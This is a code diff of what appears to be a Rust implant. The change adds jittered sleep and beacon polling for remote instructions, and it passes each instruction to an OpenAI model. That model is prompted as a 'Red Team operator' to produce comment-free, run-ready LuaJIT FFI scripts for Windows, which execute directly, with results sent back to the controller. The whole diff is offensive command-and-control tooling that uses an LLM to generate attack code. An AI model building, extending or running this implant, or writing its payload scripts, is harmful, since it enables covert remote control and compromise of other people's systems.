@@ -1,8 +1,9 @@
-use std::{collections::HashMap, error::Error};
+use std::{collections::HashMap, error::Error, thread, time::Duration};
 
 use dotenvy::dotenv;
 use mlua::{Lua, StdLib};
 use openai_api_rs::v1::{api::OpenAIClient, chat_completion::{self, ChatCompletionChoice, ChatCompletionMessage, ChatCompletionRequest, ChatCompletionResponse}};
+use rand::{rngs::ThreadRng, seq::IndexedRandom};
 use reqwest::{header::{self, HeaderMap, HeaderValue}, Client, Response};
 use serde::Deserialize;
 
@@ -18,19 +19,38 @@ const DEBUG: bool = true;
 async fn main() {
     dotenv().unwrap();
 
-    let instruction: String = get_instruction().await;
-    if instruction == String::new() {
-        println!("No Instruction");
-        return;
+    let jitter: [u64; 7] = [61, 31, 45, 120, 92, 240, 301];
+    let mut rng: ThreadRng = rand::rng();
+    let duration: &u64 = jitter.choose(&mut rng).unwrap();
+    println!("Duration: {duration}");
+
+    let sleep_dur: Duration = Duration::from_secs(*duration);
+
+    let mut prev_instruction: String = String::new();
+
+    loop {
+        println!("=== Dormant ===");
+        thread::sleep(sleep_dur);
+
+        let instruction: String = get_instruction().await;
+        if instruction == prev_instruction {
+            continue;
+        }
+        println!("**** Processing Task ****");
+
+        prev_instruction = instruction.clone();
+
+        let attempts: i32 = 1;
+
+        let result: String = ai_gen_lua(&instruction, attempts).await;
+
+        if DEBUG {
+            println!("Lua result: {result}");
+        }
+
+        send_result(&result, attempts).await;
+
     }
-
-    let attempts: i32 = 1;
-
-    let result: String = ai_gen_lua(&instruction, attempts).await;
-
-    println!("Lua result: {result}");
-
-    send_result(&result, attempts).await;
 
 }
 
@@ -57,28 +77,38 @@ async fn ai_execute(instruction: &String) -> Result<String, Box<dyn Error>> {
     let mut client: OpenAIClient = OpenAIClient::builder().with_api_key(api_key).build().unwrap();
 
     let prompt: &str = r#"
-    You are a senior Red Team operator and experienced developer. Your job is to output a Lua script to accomplish the task you are given. The script will be executed with LuaJIT, so you have full access to Lua's FFI library. The script will run on a Windows system. Do not include "local ffi = require("ffi")" in any of the code. It has already been included and the "ffi" variable is available for use. You are to make all ffi calls with "ffi.C" convention.
+    You are a senior Red Team operator and experienced developer. Your job is to output a Lua script to accomplish the task you are given. The script will be executed with LuaJIT, so you have full access to Lua's FFI library. The script will run on a Windows system. Do not include `local ffi = require("ffi")` in any of the code. It has already been included and the `ffi` variable is available for use. You are to make all ffi calls with `ffi.C` convention.
 
-	It is imperative that you write accurate and error free code. Think step by step through the process in order to accomplish the task.
+	It is imperative that you write accurate and error free code. Think step by step and prioritize accuracy over speed when creating the script.
 
-	Do not add any comments to the code. Do not print any text. Do not print your thought process. Only print code.
-
-    To avoid errors, use the following type definitions when necessary for translating Lua to C types:
+    To avoid errors, use the following type definitions at the top of the file when necessary for translating Lua types to C types:
+    ```
     typedef void* HANDLE;
     typedef void* PVOID;
     typedef void* LPVOID;
     typedef uint16_t WORD;
+    typedef unsigned char BYTE;
+    typedef unsigned char* PBYTE;
+    typedef unsigned char* LPBYTE;
     typedef long LONG;
     typedef unsigned long DWORD;
     typedef const char* LPCSTR;
+    typedef char* LPSTR;
+    typedef char* PCHAR;
+    typedef char TCHAR;
+    typedef const char* PCSTR;
+    typedef const wchar_t* LPCWSTR;
+    typedef const wchar_t* PCWSTR;
     typedef int BOOL;
     typedef unsigned long long ULONG_PTR;
     typedef char TCHAR;
     typedef size_t SIZE_T;
     typedef unsigned short wchar_t;
     typedef DWORD (*LPTHREAD_START_ROUTINE)(LPVOID);
+    ```
+    Add any other types you need to the list. Do not use a C type before you define it.
 
-    Define all types you will use at the beginning of the file before defining any structs or functions.
+	Do not add any comments to the code. Do not print any text. Do not print your thought process. Do not print the script in markdown. It will run directly from your output. Only print run-ready code.
     Store the result of the script in a string variable named "result" and return that variable at the end of the script.
     "#;
 
@@ -105,8 +135,6 @@ async fn ai_execute(instruction: &String) -> Result<String, Box<dyn Error>> {
             user_message
         ]
     );
-
-    println!("[+] Processing");
 
     let result: ChatCompletionResponse = client.chat_completion(req).await?;
 
